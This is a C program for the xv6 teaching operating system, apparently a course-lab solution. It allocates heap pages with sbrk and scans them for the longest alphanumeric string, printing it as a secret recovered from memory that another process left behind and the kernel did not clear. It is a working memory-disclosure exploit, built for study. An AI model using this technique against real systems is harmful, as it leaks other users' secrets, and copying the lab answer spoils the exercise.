#include "types.h"
#include "stat.h"
#include "user.h"

#define PAGE 4096
#define MAX_PAGES 300      //number of pages to try to allocate
#define MIN_SECRET_LEN 4   // candidate limit
#define MAX_SECRET_LEN 2048
#define RETRIES 4          //scan reattempts

static int
is_alnum(char c) {
  if (c >= '0' && c <= '9') return 1;
  if (c >= 'A' && c <= 'Z') return 1;
  if (c >= 'a' && c <= 'z') return 1;
  return 0;
}

int
main(int argc, char *argv[])
{
  int attempt;
  for (attempt = 0; attempt < RETRIES; ++attempt) {
    char *pages[MAX_PAGES];
    int allocated = 0;
    int i;

    // more pages more chances to find
    for (i = 0; i < MAX_PAGES; ++i) {
      int r = sbrk(PAGE);
      if (r < 0) break;
      pages[allocated++] = (char *)r;
    }

    int best_len = 0;
    int best_page = -1;
    int best_off = 0;

    for (i = 0; i < allocated; ++i) {
      char *base = pages[i];
      int j = 0;
      while (j < PAGE) {
        // skip non-alnum
        while (j < PAGE && !is_alnum(base[j])) j++;
        if (j >= PAGE) break;
        int start = j;
        while (j < PAGE && is_alnum(base[j])) j++;
        int len = j - start;
        if (len >= MIN_SECRET_LEN && len > best_len && len <= MAX_SECRET_LEN) {
          best_len = len;
          best_page = i;
          best_off = start;
        }
      }
    }

    if (best_len >= MIN_SECRET_LEN) {
     
      write(1, pages[best_page] + best_off, best_len);
      write(1, "\n", 1);
      exit();
    }

    // no allocations shrink heap back
    if (allocated > 0) {
      // sbrk takes bytes; free allocated*PAGE bytes (negative).
      sbrk(-allocated * PAGE);
    }

    //acts as a buffer, replaced from earlier attempt with sleep
    {
      volatile int delay = 100000;
      while (delay--) ;
    }
  }

  //last attempt last scan
  {
    char *pages[MAX_PAGES];
    int allocated = 0;
    int i;
    for (i = 0; i < MAX_PAGES; ++i) {
      int r = sbrk(PAGE);
      if (r < 0) break;
      pages[allocated++] = (char *)r;
    }

    int best_len = 0;
    int best_page = -1;
    int best_off = 0;
    for (i = 0; i < allocated; ++i) {
      char *base = pages[i];
      int j = 0;
      while (j < PAGE) {
        while (j < PAGE && !is_alnum(base[j])) j++;
        if (j >= PAGE) break;
        int start = j;
        while (j < PAGE && is_alnum(base[j])) j++;
        int len = j - start;
        if (len >= MIN_SECRET_LEN && len > best_len && len <= MAX_SECRET_LEN) {
          best_len = len;
          best_page = i;
          best_off = start;
        }
      }
    }

    if (best_len >= MIN_SECRET_LEN) {
      write(1, pages[best_page] + best_off, best_len);
      write(1, "\n", 1);
      exit();
    }
  }

  exit();
}

